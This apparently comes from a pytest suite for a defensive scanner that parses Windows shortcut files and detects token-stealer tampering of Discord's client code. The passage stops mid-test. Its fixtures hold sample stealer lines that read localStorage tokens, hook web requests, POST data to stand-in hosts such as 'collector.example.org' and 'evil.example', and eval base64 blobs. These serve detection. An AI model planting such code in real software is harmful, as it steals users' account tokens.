"""Tests for the application-tampering scanner (aegis.scanners.apptamper) and its pieces: the pure-Python shortcut
parser (aegis.core.lnk), the Discord / environment / shortcut / browser / wallet classifiers, the restore_file_content
remediation and its undo. Platform facts are injected or monkeypatched, so everything runs on Linux and Windows; the
one test that needs Windows itself (real shortcuts written by WScript.Shell) is skipped elsewhere. Secret-looking test
strings are assembled at run time so this file never contains a contiguous webhook URL or bot token."""

import json
import os
import random
import re
import shutil
import struct
import subprocess
import sys
import time
from pathlib import Path

import pytest

from aegis.core import remediation as rem
from aegis.core.config import Config
from aegis.core.lnk import LINK_CLSID, LnkInfo, parse_lnk, read_lnk
from aegis.core.models import CheckResult, CheckStatus, Finding, Severity
from aegis.protect import undo
from aegis.scanners import apptamper as at
from aegis.scanners.base import REGISTRY, load_all

FINDING = Finding("AEG-TEST", "t", Severity.LOW, "system")


def rules(findings):
    return [f.rule_id for f in findings]


def split(out):
    return [x for x in out if isinstance(x, Finding)], [x for x in out if isinstance(x, CheckResult)]


def webhook_url(token="aB3dE5gH7jK9mN1pQ3sT5vX7yZ2bC4dE6fG8"):
    return "https://discord.com/api/" + "webhooks/" + "1234567890123456789" + "/" + token


def telegram_url():
    return "https://api.telegram.org/" + "bot" + "5551234567" + ":" + "AAH" + "x9Zy8W7v6U5t4S3r2Q1p0O9n8M7l6K5j4I3"


# =========================================================================== LNK builder (follows MS-SHLLINK)
def u16(n):
    return struct.pack("<H", n)


def u32(n):
    return struct.pack("<I", n)


def _ansi(text):
    return text.encode("cp1252", "replace") + b"\0"


def _utf16(text):
    return text.encode("utf-16-le") + b"\0\0"


def build_link_info(local="", suffix="", unicode_fields=False, network=""):
    header_size = 0x24 if unicode_fields else 0x1C
    off = header_size
    body = b""
    flags = volume_off = local_off = net_off = local_uni = suffix_uni = 0
    if network:
        flags, net_off = 0x2, off
        link = u32(0x14 + len(_ansi(network))) + u32(0) + u32(0x14) + u32(0) + u32(0) + _ansi(network)
        body += link
        off += len(link)
    else:
        flags, volume_off = 0x1, off
        label = b"OS\0"
        vol = u32(0x10 + len(label)) + u32(3) + u32(0xCAFEBABE) + u32(0x10) + label
        body += vol
        off += len(vol)
        local_off = off
        body += _ansi(local)
        off += len(_ansi(local))
    suffix_off = off
    body += _ansi(suffix)
    off += len(_ansi(suffix))
    if unicode_fields:
        if not network:
            local_uni = off
            body += _utf16(local)
            off += len(_utf16(local))
        suffix_uni = off
        body += _utf16(suffix)
        off += len(_utf16(suffix))
    head = u32(off) + u32(header_size) + u32(flags) + u32(volume_off) + u32(local_off) + u32(net_off) + u32(suffix_off)
    if unicode_fields:
        head += u32(local_uni) + u32(suffix_uni)
    return head + body


def build_env_block(target):
    ansi = target.encode("cp1252", "replace")[:259].ljust(260, b"\0")
    uni = target.encode("utf-16-le")[:518].ljust(520, b"\0")
    return u32(0x314) + u32(0xA0000001) + ansi + uni


def build_lnk(target="", args="", working_dir="", relative="", icon="", name="", env_target="", unicode_strings=True,
              link_info=True, unicode_link_info=False, id_list=True, network="", suffix="", terminal=True):
    has_info = link_info and bool(target or network)
    flags = (0x01 if id_list else 0) | (0x02 if has_info else 0) | (0x04 if name else 0) | (0x08 if relative else 0) \
        | (0x10 if working_dir else 0) | (0x20 if args else 0) | (0x40 if icon else 0) | (0x80 if unicode_strings else 0) \
        | (0x200 if env_target else 0)
    header = u32(0x4C) + LINK_CLSID + u32(flags) + u32(0x20) + b"\0" * 24 + u32(0) + u32(0) + u32(1) + u16(0) + u16(0) \
        + u32(0) + u32(0)
    assert len(header) == 0x4C
    out = header
    if id_list:
        items = u16(0x14) + b"\x1f\x50" + b"\0" * 16
        out += u16(len(items) + 2) + items + u16(0)
    if has_info:
        out += build_link_info(target, suffix, unicode_link_info, network)
    for value in (name, relative, working_dir, args, icon):
        if value:
            out += u16(len(value)) + (value.encode("utf-16-le") if unicode_strings else value.encode("cp1252", "replace"))
    if env_target:
        out += build_env_block(env_target)
    return out + (u32(0) if terminal else b"")


CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"


# =========================================================================== LNK parser: synthetic input
def test_parse_lnk_reads_every_field():
    data = build_lnk(CHROME, args='--profile-directory="Profile 1" --app-id=abc', working_dir=r"C:\Program Files\Google\Chrome\Application",
                     relative=r"..\..\Google\Chrome\Application\chrome.exe", icon=CHROME + ",0", name="Browse the web")
    info = parse_lnk(data)
    assert isinstance(info, LnkInfo)
    assert info.target_path == CHROME and info.arguments == '--profile-directory="Profile 1" --app-id=abc'
    assert info.working_dir == r"C:\Program Files\Google\Chrome\Application"
    assert info.relative_path == r"..\..\Google\Chrome\Application\chrome.exe"
    assert info.icon_location == CHROME + ",0" and info.name == "Browse the web" and info.description == "Browse the web"
    assert info.env_target == "" and info.truncated is False and info.show_command == 1
    assert info.command_line == CHROME + ' --profile-directory="Profile 1" --app-id=abc'


def test_parse_lnk_ansi_string_data_and_code_page():
    data = build_lnk(r"C:\Café\app.exe", args="--name=Zoë", working_dir=r"C:\Café", name="Café", unicode_strings=False)
    info = parse_lnk(data)
    assert info.target_path == r"C:\Café\app.exe" and info.arguments == "--name=Zoë" and info.working_dir == r"C:\Café"
    assert info.name == "Café"
    undefined = bytearray(build_lnk(r"C:\x\a.exe", args="AAAA", unicode_strings=False))
    at_args = bytes(undefined).index(b"AAAA")
    undefined[at_args:at_args + 1] = b"\x81"  # one of the five bytes cp1252 leaves undefined: falls back to latin-1
    assert parse_lnk(bytes(undefined)).arguments == "\x81AAA"


def test_parse_lnk_prefers_unicode_local_path_over_lossy_ansi():
    target = "C:\\Users\\тест\\日本語.exe"
    data = build_lnk(target, unicode_link_info=True)
    assert b"?" in data[0x4C:]  # the ANSI copy lost the characters
    assert parse_lnk(data).target_path == target
    assert parse_lnk(build_lnk(target)).target_path == "C:\\Users\\????\\???.exe"  # no Unicode copy: only the lossy one


def test_parse_lnk_common_path_suffix_and_network_share():
    assert parse_lnk(build_lnk(r"C:\Program Files", suffix=r"App\run.exe")).target_path == r"C:\Program Files\App\run.exe"
    assert parse_lnk(build_lnk("C:\\Program Files\\", suffix=r"App\run.exe")).target_path == r"C:\Program Files\App\run.exe"
    net = parse_lnk(build_lnk(network=r"\\fileserver\share", suffix=r"tools\run.exe"))
    assert net.target_path == r"\\fileserver\share\tools\run.exe"


def test_parse_lnk_environment_variable_block():
    resolved = r"C:\Windows\System32\cmd.exe"
    env = r"%windir%\system32\cmd.exe"
    info = parse_lnk(build_lnk(resolved, args="/c calc", env_target=env))
    assert info.env_target == env and info.target_path == env  # a %VAR% target beats the resolved copy
    plain = parse_lnk(build_lnk(resolved, env_target=resolved))
    assert plain.env_target == resolved and plain.target_path == resolved
    only_env = parse_lnk(build_lnk("", args="x", env_target=r"C:\Tools\a.exe", link_info=False))
    assert only_env.target_path == r"C:\Tools\a.exe"  # no LinkInfo at all: the block is the target
    unicode_env = parse_lnk(build_lnk(resolved, env_target="%USERPROFILE%\\日本語\\a.exe"))
    assert unicode_env.env_target == "%USERPROFILE%\\日本語\\a.exe"


def test_parse_lnk_without_target_data():
    info = parse_lnk(build_lnk("", args="--flag", relative=r".\a.exe", link_info=False, id_list=False))
    assert info.target_path == "" and info.arguments == "--flag" and info.relative_path == r".\a.exe"
    assert parse_lnk(build_lnk(CHROME, id_list=False)).target_path == CHROME  # IDList is optional


@pytest.mark.parametrize("data", [
    b"", b"L\x00\x00\x00", b"\x00" * 200, b"MZ" + b"\x00" * 200, "text, not bytes", None, 5,
    u32(0x4D) + LINK_CLSID + b"\0" * 60,  # wrong header size
    u32(0x4C) + b"\x00" * 16 + b"\0" * 56,  # wrong LinkCLSID
    u32(0x4C) + LINK_CLSID[:-1] + b"\x47" + b"\0" * 56,
    (u32(0x4C) + LINK_CLSID + b"\0" * 56)[:75],  # one byte short of a header
])
def test_parse_lnk_rejects_anything_that_is_not_a_shell_link(data):
    assert parse_lnk(data) is None


def test_parse_lnk_header_only_and_buffer_types():
    header = u32(0x4C) + LINK_CLSID + b"\0" * 56
    info = parse_lnk(header)
    assert isinstance(info, LnkInfo) and info.target_path == "" and info.truncated is False
    data = build_lnk(CHROME, args="--x")
    assert parse_lnk(bytearray(data)).arguments == "--x" and parse_lnk(memoryview(data)).target_path == CHROME


def test_parse_lnk_truncated_input_never_raises_and_keeps_what_it_can():
    full = build_lnk(CHROME, args="--load-extension=C:\\ext", working_dir=r"C:\w", name="n", relative=r".\chrome.exe",
                     icon="i.ico", env_target=r"%programfiles%\Google\chrome.exe")
    whole = parse_lnk(full)
    assert whole.truncated is False and whole.arguments == "--load-extension=C:\\ext"
    for cut in range(len(full)):
        info = parse_lnk(full[:cut])
        if cut < 0x4C:
            assert info is None
        else:
            assert isinstance(info, LnkInfo)
    assert parse_lnk(full[:0x4C + 2 + 0x14 + 20]).truncated is True  # cut inside LinkInfo
    cut_in_args = parse_lnk(full[:full.index("--load".encode("utf-16-le")) + 12])
    assert cut_in_args.truncated is True and cut_in_args.arguments.startswith("--lo")
    assert parse_lnk(full[:-1]).target_path.startswith("%programfiles%")  # only the terminal block is incomplete


def test_parse_lnk_hostile_sizes_and_offsets():
    base = bytearray(build_lnk(CHROME, args="--x", name="n"))
    flags = struct.unpack_from("<I", base, 20)[0]
    assert flags & 1 and flags & 2
    idl = 0x4C
    for patch in (
        lambda b: struct.pack_into("<H", b, idl, 0xFFFF),  # IDList longer than the file
        lambda b: struct.pack_into("<I", b, idl + 2 + struct.unpack_from("<H", b, idl)[0], 0xFFFFFFFF),  # LinkInfoSize
        lambda b: struct.pack_into("<I", b, idl + 2 + struct.unpack_from("<H", b, idl)[0], 0),
        lambda b: struct.pack_into("<I", b, idl + 2 + struct.unpack_from("<H", b, idl)[0] + 16, 0xFFFFFF00),  # LocalBasePathOffset
        lambda b: struct.pack_into("<I", b, idl + 2 + struct.unpack_from("<H", b, idl)[0] + 4, 0x00FF00FF),  # header size
    ):
        mutated = bytearray(base)
        patch(mutated)
        info = parse_lnk(bytes(mutated))
        assert info is None or isinstance(info, LnkInfo)
    huge_count = bytearray(base)
    huge_count[-12:-10] = b"\xff\xff"
    assert isinstance(parse_lnk(bytes(huge_count)), LnkInfo)
    only_header = u32(0x4C) + LINK_CLSID + u32(0xFFFFFFFF) + b"\0" * 52
    assert isinstance(parse_lnk(only_header), LnkInfo)  # every flag set and no data behind the header


def test_parse_lnk_fuzzed_input_never_raises():
    rng = random.Random(20261016)
    seeds = [build_lnk(CHROME, args="--a --b", working_dir=r"C:\w", name="n", relative=r".\c.exe", icon="i", env_target=r"%a%\b.exe"),
             build_lnk(r"C:\x\日本.exe", unicode_link_info=True, unicode_strings=False, args="q"),
             build_lnk(network=r"\\h\s", suffix="a\\b.exe", args="z", terminal=False)]
    for _ in range(1500):
        data = bytearray(rng.choice(seeds))
        for _i in range(rng.randint(1, 12)):
            data[rng.randrange(len(data))] = rng.randrange(256)
        if rng.random() < 0.3:
            data = data[:rng.randrange(len(data))]
        info = parse_lnk(bytes(data))
        assert info is None or isinstance(info, LnkInfo)
    for _ in range(300):
        junk = u32(0x4C) + LINK_CLSID + bytes(rng.randrange(256) for _i in range(rng.randint(0, 900)))
        assert isinstance(parse_lnk(junk), (LnkInfo, type(None)))


# the worked example of the MS-SHLLINK specification (a shortcut to C:\test\a.txt written by Windows, with a tracker block)
MS_SHLLINK_EXAMPLE = (
    "TAAAAAEUAgAAAAAAwAAAAAAAAEabAAgAIAAAANDp7vIVFckB0Onu8hUVyQHQ6e7yFRXJAQAAAAAAAAAAAQAAAAAAAAAAAAAAAAAA"
    "AL0AFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAARgAxAAAAAAAsOWmjEAB0ZXN0AAAyAAcABADv"
    "viw5ZaMsOWmjJgAAAAMeAAAAAPUeAAAAAAAAAAAAAHQAZQBzAHQAAAAUAEgAMgAAAAAALDlpoyAAYS50eHQANAAHAAQA774sOWmj"
    "LDlpoyYAAAAtbgAAAACWAQAAAAAAAAAAAABhAC4AdAB4AHQAAAAUAAAAPAAAABwAAAABAAAAHAAAAC0AAAAAAAAAOwAAABEAAAAD"
    "AAAAgYp6MBAAAAAAQzpcdGVzdFxhLnR4dAAABwAuAFwAYQAuAHQAeAB0AAcAQwA6AFwAdABlAHMAdABgAAAAAwAAoFgAAAAAAAAA"
    "Y2hyaXMteHBzAAAAAAAAAEB4x5RH+sdGs1ZcLca20RXsRs17In/dEZSZABNyFodKQHjHlEf6x0azVlwtxrbRFexGzXsif90RlJkA"
    "E3IWh0oAAAAA")


def test_parse_lnk_specification_example():
    import base64

    data = base64.b64decode(MS_SHLLINK_EXAMPLE)
    assert len(data) == 459
    info = parse_lnk(data)
    assert info.target_path == "C:\\test\\a.txt" and info.working_dir == "C:\\test" and info.relative_path == ".\\a.txt"
    assert info.arguments == "" and info.icon_location == "" and info.name == "" and info.env_target == ""
    assert info.truncated is False and info.link_flags & 0x80  # Unicode string data, a tracker block behind it
    for cut in range(0x4C, len(data)):  # every truncation of a real file still parses without raising
        assert isinstance(parse_lnk(data[:cut]), LnkInfo)


def test_read_lnk_from_disk(tmp_path):
    p = tmp_path / "a.lnk"
    p.write_bytes(build_lnk(CHROME, args="--x"))
    assert read_lnk(str(p)).arguments == "--x"
    (tmp_path / "junk.lnk").write_bytes(b"not a shortcut")
    assert read_lnk(str(tmp_path / "junk.lnk")) is None and read_lnk(str(tmp_path / "missing.lnk")) is None
    assert read_lnk(str(tmp_path)) is None  # a directory


# =========================================================================== LNK parser: real Windows shortcuts
def _long_path(p):
    import ctypes

    buf = ctypes.create_unicode_buffer(32768)
    return buf.value if ctypes.windll.kernel32.GetLongPathNameW(str(p), buf, 32768) else str(p)


def _same_path(a, b):
    return os.path.normcase(_long_path(a)) == os.path.normcase(_long_path(b))


@pytest.mark.skipif(sys.platform != "win32", reason="creates shortcuts with WScript.Shell, which only exists on Windows")
def test_parse_real_windows_shortcuts(tmp_path):
    """Shortcuts written by Windows itself (WScript.Shell) parse to the same target, arguments and working directory.

    PowerShell creates the folder, the target files and the shortcuts itself under %TEMP%: on the CI runners
    WScript.Shell could not save a shortcut inside pytest's tmp_path (created with mode 0o700, which recent Pythons
    turn into an owner-only ACL)."""
    ps = shutil.which("powershell") or shutil.which("pwsh")
    if not ps:
        pytest.skip("PowerShell not found")
    names = [("plain.exe", '--profile-directory="Profile 1" --app-id=abcdefghijklmnop'),
             ("quoted.exe", '--load-extension="C:\\Some Dir\\ext one" --flag=a b "quoted arg" \'single\' --end'),
             ("тест-Ünïcödé-日本語.exe", "--new-window https://example.com/a?b=1&c=2"),
             ("no args.exe", "")]

    def q(text):  # PowerShell single-quoted literal
        return "'" + text.replace("'", "''") + "'"

    base_name = f"aegis-lnk-test-{os.getpid()}-{random.randrange(1 << 30)}"
    lines = ["$ErrorActionPreference = 'Stop'",
             f"$base = Join-Path $env:TEMP {q(base_name)}",
             "$tools = New-Item -ItemType Directory -Path (Join-Path $base 'tools dir') -Force",
             "$work = New-Item -ItemType Directory -Path (Join-Path $base 'work dir') -Force",
             "[IO.File]::WriteAllText((Join-Path $base 'probe.txt'), 'x')",
             "Write-Output \"BASE=$base\"",
             "$ws = New-Object -ComObject WScript.Shell"]
    for i, (name, args) in enumerate(names):
        lines += [f"Write-Output 'case {i}'",
                  f"$t = Join-Path $tools.FullName {q(name)}",
                  "[IO.File]::WriteAllBytes($t, [byte[]](77, 90, 0, 0))",
                  f"$s = $ws.CreateShortcut((Join-Path $base 'case{i}.lnk'))",
                  "$s.TargetPath = $t"]
        if args:
            lines.append(f"$s.Arguments = {q(args)}")
        lines += ["$s.WorkingDirectory = $work.FullName", "$s.Save()"]
    script = tmp_path / "make.ps1"
    script.write_bytes(("\r\n".join(lines) + "\r\n").encode("utf-8-sig"))  # BOM: Windows PowerShell 5.1 reads UTF-8
    done = subprocess.run([ps, "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-File", str(script)],
                          capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=180)
    base = next((ln[5:].strip() for ln in done.stdout.splitlines() if ln.startswith("BASE=")), "")
    try:
        if done.returncode != 0:
            pytest.fail(f"PowerShell could not create the shortcuts (exit {done.returncode}):\n{done.stdout}\n{done.stderr}")
        for i, (name, args) in enumerate(names):
            lnk = Path(base) / f"case{i}.lnk"
            info = read_lnk(str(lnk))
            assert info is not None, (str(lnk), lnk.stat().st_size, lnk.read_bytes()[:96].hex())
            assert _same_path(info.target_path, Path(base) / "tools dir" / name), (info.target_path, name)
            assert info.arguments == args
            assert _same_path(info.working_dir, Path(base) / "work dir")
    finally:
        if base and Path(base).name == base_name:
            shutil.rmtree(base, ignore_errors=True)


# =========================================================================== Discord classifier
GENUINE_FORMS = [
    "module.exports = require('./core.asar');",
    'module.exports = require("./core.asar");',
    "module.exports=require('./core.asar')",
    "  module.exports  =  require( './core.asar' ) ;  \n\n",
    "module.exports = require('./core.asar');\r\n",
    "\ufeffmodule.exports = require('./core.asar');",
    "// Discord\nmodule.exports = require('./core.asar'); // keep\n/* end */",
]


@pytest.mark.parametrize("content", GENUINE_FORMS)
def test_discord_genuine_content_is_clean(content):
    assert at.classify_discord_index(content).status == "genuine"
    assert at.classify_discord_index(content.encode("utf-8")).status == "genuine"


def test_discord_genuine_constant_is_genuine():
    assert at.classify_discord_index(at.GENUINE_INDEX_JS).status == "genuine"
    assert rem.GENUINE_FILE_CONTENT.match(at.GENUINE_INDEX_JS)


@pytest.mark.parametrize("path,names", [
    (r"C:\\Users\\Bob\\AppData\\Roaming\\BetterDiscord\\data\\betterdiscord.asar", ["BetterDiscord"]),
    (r"C:\\Users\\Bob\\AppData\\Roaming\\Vencord\\dist\\patcher.js", ["Vencord"]),
    ("/home/bob/.config/Equicord/dist/patcher.js", ["Equicord"]),
    ("/home/bob/.config/replugged/app.asar", ["Replugged"]),
    ("/home/bob/powercord/src/patcher.js", ["Powercord"]),
    ("/Users/bob/Library/Application Support/shelter/shelter.js", ["Shelter"]),
])
def test_discord_client_mod_is_info_not_malware(path, names):
    for quote in ('"', "'"):
        content = f"require({quote}{path}{quote});\nmodule.exports = require('./core.asar');"
        v = at.classify_discord_index(content)
        assert v.status == "mod" and v.severity == Severity.INFO and v.mods == names, content
        assert v.mod_paths and v.indicators == []


def test_discord_two_mods_and_mod_after_genuine_line():
    content = ('require("C:\\\\Users\\\\B\\\\AppData\\\\Roaming\\\\BetterDiscord\\\\data\\\\betterdiscord.asar");\n'
               'require("/opt/vencord/patcher.js");\nmodule.exports = require("./core.asar");')
    v = at.classify_discord_index(content)
    assert v.status == "mod" and v.mods == ["BetterDiscord", "Vencord"]
    after = "module.exports = require('./core.asar');\nrequire('/home/x/vencord/patcher.js');"
    assert at.classify_discord_index(after).status == "mod"


@pytest.mark.parametrize("content", [
    "require('C:\\\\Users\\\\Bob\\\\evil.js');\nmodule.exports = require('./core.asar');",  # a require that is not a mod
    "require('/x/BetterDiscord/a.js');\nconsole.log(1);\nmodule.exports = require('./core.asar');",  # mod + other code
    "require('https://betterdiscord.example/x.js');\nmodule.exports = require('./core.asar');",  # a URL naming a mod
    "require('/x/vencord/patcher.js');",  # genuine line missing
    "module.exports = require('./core.asar');\nmodule.exports = require('./core.asar');",  # duplicated
    "require(path.join(__dirname, 'BetterDiscord.asar'));\nmodule.exports = require('./core.asar');",  # not a literal path
    "module.exports = require('./other.asar');",
    "'use strict';\nmodule.exports = require('./core.asar');",
    "",
    "   \n  ",
    "\x00\x01\x02 binary \xff",
    "console.log('hi');",
])
def test_discord_any_other_change_is_high(content):
    v = at.classify_discord_index(content)
    assert v.status == "tampered" and v.severity == Severity.HIGH and v.indicators == []


def test_discord_large_file_is_tampered_without_statement_analysis():
    big = at.GENUINE_INDEX_JS + "\n" + "// padding line\n" * 2000
    v = at.classify_discord_index(big)
    assert v.status == "tampered" and v.severity == Severity.HIGH


STEALER_CASES = {
    "hard-coded Discord webhook URL": lambda: f"const u = '{webhook_url()}';\nmodule.exports = require('./core.asar');",
    "Telegram bot API URL": lambda: f"const t = '{telegram_url()}';",
    "reads tokens / localStorage": lambda: "var t = window.localStorage.getItem('token');",
    "hooks web requests": lambda: ("const {session} = require('electron');\nsession.defaultSession.webRequest.onCompleted("
                                   "{urls: ['*://discord.com/api/v*/users/@me']}, () => {});"),
    "hooks web requests (billing)": lambda: "mainWindow.webContents.session.webRequest.onBeforeRequest({urls:['*://*/billing/*']}, f);",
    "sends data to an external server": lambda: "require('https').request('https://collector.example.org/in', {method: 'POST'});",
    "eval": lambda: "eval(Buffer.from(x, 'base64').toString());",
    "new Function": lambda: "new Function('return 1')();",
    "base64": lambda: "const blob = '" + "QUJD" * 60 + "';",
}


@pytest.mark.parametrize("needle", list(STEALER_CASES))
def test_discord_stealer_indicators_raise_to_critical(needle):
    v = at.classify_discord_index("require('./x.js');\n" + STEALER_CASES[needle]())
    assert v.status == "tampered" and v.severity == Severity.CRITICAL
    assert any(needle.split(" (")[0].lower() in i.lower() for i in v.indicators), v.indicators


def test_discord_benign_modification_has_no_indicators():
    code = "module.exports = require('./core.asar');\nconsole.log('patched');\nfetch('https://discord.com/api/v9/users/@me');"
    v = at.classify_discord_index(code)
    assert v.severity == Severity.HIGH and v.indicators == []  # discord.com itself is not an external server
    ind, hosts = at.discord_stealer_indicators("https.request({hostname: 'evil.example'}, cb)")
    assert hosts == ["evil.example"] and ind and "evil.example" in ind[0]
    assert at.discord_stealer_indicators("fetch('https://cdn.discordapp.com/x')") == ([], [])
    assert at.discord_stealer_indicators("// no code here\n")[0] == []


def test_discord_excerpt_masks_tokens_before_truncating():
    token = "aB3dE5gH7jK9mN1pQ3sT5vX7yZ2bC4dE6fG8"
    url_head = webhook_url(token)[:-len(token)]
    lead, tail = "var pad = '", "'; fetch('"
    pad = at.EXCERPT_CHARS - 10 - len(lead) - len(tail) - len(url_head)  # the token would start 10 characters before the cut
    code = lead + "." * pad + tail + webhook_url(token) + "');"
    assert len(lead + "." * pad + tail + url_head) == at.EXCERPT_CHARS - 10
    v = at.classify_discord_index(code)
    assert v.severity == Severity.CRITICAL and len(v.excerpt) <= at.EXCERPT_CHARS
    assert token[:5] not in v.excerpt and "webhooks/1234567890123456789/***" in v.excerpt
    tg = at.classify_discord_index("x=" + telegram_url()).excerpt
    assert "AAHx9Zy8" not in tg and "api.telegram.org/bot***" in tg
    blob = at.classify_discord_index("x='" + "QUJD" * 100 + "'").excerpt
    assert "QUJDQUJD" not in blob and "<base64 400 chars>" in blob


def test_mask_secrets_covers_each_secret_shape():
    assert at.mask_secrets(webhook_url("tokentokentoken")) == webhook_url("***")
    assert at.mask_secrets(telegram_url()).endswith("api.telegram.org/bot***")
    assert at.mask_secrets("--proxy-server=http://user:hunter2@10.0.0.1:8080") == "--proxy-server=http://***@10.0.0.1:8080"
    assert at.mask_secrets("slow " + "A" * 150) == "slow <base64 150 chars>"
    assert at.mask_secrets("nothing secret here") == "nothing secret here"


def test_strip_js_comments_respects_strings():
    assert at._strip_js_comments("a(); // c\nb('//x'); /* y */ c(\"/*\");") == "a(); \nb('//x');   c(\"/*\");"
    assert "evil" not in at._strip_js_comments("/* evil */ ok // evil2")
    assert at._strip_js_comments("x = 'a\\'//b'; y // z").startswith("x = 'a\\'//b';")


# =========================================================================== Discord discovery, findings, check
def make_index(root, rel, content):
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8", newline="")
    return p


def test_discord_discovery_per_platform(tmp_path):
    home = tmp_path / "home"
    local = tmp_path / "Local"
    for folder in ("Discord", "DiscordPTB", "DiscordCanary", "DiscordDevelopment"):
        make_index(local, f"{folder}/app-1.0.9001/modules/discord_desktop_core-1/discord_desktop_core/index.js", "x")
    make_index(local, "Discord/app-1.0.9000/modules/discord_desktop_core-2/discord_desktop_core/index.js", "x")
    make_index(local, "Discord/app-1.0.9001/modules/discord_other-1/discord_desktop_core/index.js", "x")  # not the core module
    make_index(local, "DiscordX/app-1/modules/discord_desktop_core-1/discord_desktop_core/index.js", "x")  # not a client
    win = at.discord_index_files("windows", home, local)
    assert [label for label, _p in win] == ["Discord", "Discord", "Discord PTB", "Discord Canary", "Discord Development"]
    assert all(p.name == "index.js" and p.is_file() for _l, p in win)

    make_index(home, ".config/discord/0.0.45/modules/discord_desktop_core/index.js", "x")
    make_index(home, ".config/discordptb/0.0.60/modules/discord_desktop_core/index.js", "x")
    make_index(home, ".config/discordcanary/0.0.70/modules/discord_desktop_core/index.js", "x")
    make_index(home, ".var/app/com.discordapp.Discord/config/discord/0.0.45/modules/discord_desktop_core/index.js", "x")
    lin = at.discord_index_files("linux", home)
    assert sorted(label for label, _p in lin) == ["Discord", "Discord", "Discord Canary", "Discord PTB"]
    assert any("com.discordapp.Discord" in str(p) for _l, p in lin)

    make_index(home, "Library/Application Support/discord/0.0.300/modules/discord_desktop_core/index.js", "x")
    make_index(home, "Library/Application Support/discordcanary/0.0.400/modules/discord_desktop_core/index.js", "x")
    mac = at.discord_index_files("darwin", home)
    assert sorted(label for label, _p in mac) == ["Discord", "Discord Canary"]
    assert at.discord_index_files("linux", tmp_path / "nobody") == []


def test_discord_finding_for_tampered_file(tmp_path):
    code = "module.exports = require('./core.asar');\nfetch('" + webhook_url() + "');"
    path = make_index(tmp_path, "modules/discord_desktop_core/index.js", code)
    data = path.read_bytes()
    f = at.discord_finding("Discord", path, at.classify_discord_index(data), data, len(data))
    assert f.rule_id == "AEG-TAMPER-DISCORD" and f.severity == Severity.CRITICAL and f.category == "malware"
    assert f.title == "Discord client code was modified (possible token-stealer injection)"
    assert f.location == str(path) and f.mitre == ["T1554", "T1539"]
    assert "webhook" in f.description and "core.asar" in f.description
    for phrase in ("Quit Discord", "password", "two-factor", "full Aegis scan"):
        assert phrase in f.recommendation
    assert f.remediation.action == "restore_file_content"
    assert f.remediation.params == {"path": str(path), "content": at.GENUINE_INDEX_JS}
    assert f.evidence["client"] == "Discord" and f.evidence["indicators"] and f.evidence["sha256"]
    assert "aB3dE5gH7jK9" not in json.dumps(f.to_dict())  # nothing in the finding carries the webhook token

    plain = make_index(tmp_path, "b/modules/discord_desktop_core/index.js", "console.log(1)")
    d = plain.read_bytes()
    g = at.discord_finding("Discord", plain, at.classify_discord_index(d), d, len(d))
    assert g.severity == Severity.HIGH and g.category == "suspicious" and g.remediation is not None


def test_discord_finding_for_mod_and_genuine(tmp_path):
    mod = make_index(tmp_path, "m/modules/discord_desktop_core/index.js",
                     "require('/x/BetterDiscord/data/betterdiscord.asar');\nmodule.exports = require('./core.asar');")
    d = mod.read_bytes()
    f = at.discord_finding("Discord Canary", mod, at.classify_discord_index(d), d, len(d))
    assert f.rule_id == "AEG-TAMPER-DISCORD-MOD" and f.severity == Severity.INFO and f.title == "Discord client mod installed"
    assert f.remediation is None and f.evidence["mods"] == ["BetterDiscord"] and f.mitre == ["T1554", "T1539"]
    ok = make_index(tmp_path, "g/modules/discord_desktop_core/index.js", at.GENUINE_INDEX_JS)
    d = ok.read_bytes()
    assert at.discord_finding("Discord", ok, at.classify_discord_index(d), d, len(d)) is None


def test_check_discord_statuses(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(at, "find_discord_files", lambda: [])
    out = list(at.check_discord(ctx))
    assert [(c.check_id, c.status) for c in out] == [("AEG-TAMPER-DISCORD", CheckStatus.SKIP)]

    good = make_index(tmp_path, "a/modules/discord_desktop_core/index.js", at.GENUINE_INDEX_JS)
    mod = make_index(tmp_path, "b/modules/discord_desktop_core/index.js",
                     'require("/home/x/.config/vencord/patcher.js");\nmodule.exports = require("./core.asar");')
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", good), ("Discord PTB", mod)])
    findings, checks = split(list(at.check_discord(ctx)))
    assert rules(findings) == ["AEG-TAMPER-DISCORD-MOD"] and checks[0].status == CheckStatus.PASS
    assert "1 genuine, 1 with a client mod, 0 modified" in checks[0].detail

    bad = make_index(tmp_path, "c/modules/discord_desktop_core/index.js", "console.log('x')")
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", good), ("Discord", bad)])
    findings, checks = split(list(at.check_discord(ctx)))
    assert rules(findings) == ["AEG-TAMPER-DISCORD"] and checks[0].status == CheckStatus.FAIL
    assert ctx.stats["tamper_discord_files"] == 4


def test_check_discord_unreadable_file_is_not_reported_as_modified(ctx, tmp_path, monkeypatch):
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", tmp_path / "gone" / "index.js")])
    findings, checks = split(list(at.check_discord(ctx)))
    assert findings == [] and checks[0].status == CheckStatus.PASS
    assert "0 genuine, 0 with a client mod, 0 modified, 1 could not be read" in checks[0].detail
    real = make_index(tmp_path, "r/modules/discord_desktop_core/index.js", at.GENUINE_INDEX_JS)
    assert at._read_head(tmp_path / "nothing.js", 10) is None and at._read_head(real, 10) == at.GENUINE_INDEX_JS.encode()[:10]
    monkeypatch.setattr(at, "find_discord_files", lambda: [("Discord", real)])
    monkeypatch.setattr(at, "_read_head", lambda path, limit: None)  # exists, but opening it fails (permissions, lock)
    findings, checks = split(list(at.check_discord(ctx)))
    assert findings == [] and "1 could not be read" in checks[0].detail and checks[0].status == CheckStatus.PASS


# =========================================================================== Electron / Node environment
def test_electron_run_as_node_is_high():
    issues = at.classify_node_environment({"ELECTRON_RUN_AS_NODE": "1", "PATH": r"C:\Windows"})
    assert [(i.rule_id, i.name, i.value) for i in issues] == [("AEG-TAMPER-ELECTRON-NODE", "ELECTRON_RUN_AS_NODE", "1")]
    assert at.classify_node_environment({"electron_run_as_node": "true"})[0].name == "electron_run_as_node"  # names are case-insensitive
    assert at.classify_node_environment({"ELECTRON_RUN_AS_NODE": "0"})  # any non-empty value switches it on
    for empty in ("", "   ", None):
